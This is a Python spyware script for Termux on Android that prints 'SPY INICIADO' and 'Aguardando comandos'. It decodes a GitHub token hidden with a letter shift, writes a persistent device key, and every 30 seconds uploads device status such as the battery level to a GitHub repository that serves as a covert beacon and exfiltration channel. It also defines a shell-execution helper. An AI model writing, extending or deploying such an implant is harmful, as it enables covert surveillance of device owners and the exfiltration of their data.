import os, json, time, subprocess, requests, base64, random, string
from datetime import datetime

TOKEN = None
for t in ["now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da"]:
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    TOKEN = r

REPO = "gynbetfc/eyelive"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
CONFIG = "/data/data/com.termux/files/home/.eyelive_key"

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=10).strip()
    except: return ""

# Pegar ou gerar chave única
if os.path.exists(CONFIG):
    with open(CONFIG) as f:
        KEY = f.read().strip()
else:
    KEY = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    with open(CONFIG, 'w') as f:
        f.write(KEY)

print(f"\nSPY INICIADO - CHAVE: {KEY}\n")

def salvar_status():
    b = shell("termux-battery-status 2>/dev/null")
    bat = ""
    if b:
        try: bat = str(json.loads(b).get("percentage","?")) + "%"
        except: pass
    
    dados = {
        "time": datetime.now().strftime("%H:%M:%S"),
        "bateria": bat,
        "key": KEY
    }
    
    try:
        fn = f"dados/{KEY}/status.json"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        c = json.dumps(dados)
        encoded = base64.b64encode(c.encode()).decode()
        r = requests.get(url, headers=HEADERS)
        p = {"message":"Update","content":encoded,"branch":"main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        requests.put(url, json=p, headers=HEADERS)
    except: pass

print("👻 Aguardando comandos...")
while True:
    salvar_status()
    time.sleep(30)
